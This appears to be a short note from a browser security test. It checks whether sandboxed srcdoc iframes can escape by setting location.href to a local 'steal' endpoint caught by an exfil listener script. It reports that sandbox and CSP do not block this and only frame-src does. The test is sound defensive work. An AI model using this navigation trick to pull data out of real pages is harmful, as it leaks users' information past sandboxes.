Does a sandboxed srcdoc frame self-navigate?

Four frames try location.href = "http://127.0.0.1:9999/steal?via=…". Start the listener first: python3 demo/exfil-listener.py. Whatever appears in its terminal navigated successfully; whatever doesn't, didn't.

Confirmed in a real browser: all four navigate. The sandbox does not stop a frame leaving, and neither does the CSP. Only the embedder's frame-src does — which is what the warden supplies. Headless Chrome reports the opposite and is wrong; do not trust it here.
